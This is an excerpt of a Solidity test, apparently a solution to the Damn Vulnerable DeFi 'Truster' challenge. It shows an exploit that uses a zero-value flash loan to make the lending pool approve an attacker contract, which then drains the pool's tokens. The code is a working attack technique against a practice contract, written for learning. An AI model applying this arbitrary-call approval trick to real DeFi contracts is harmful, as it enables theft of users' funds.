...
import {attack} from "../../../src/Contracts/truster/attack.sol";
...
contract Truster is Test {
    ...
    function testExploit() public {
        ...
        trusterLenderPool.flashLoan(
            0, attacker, address(dvt), abi.encodeWithSignature("approve(address,uint256)", address(att), 1 * 10 ** 30)
        );
        att.getermoney(address(trusterLenderPool), address(dvt));
        /**
         * EXPLOIT END *
         */
        validation();
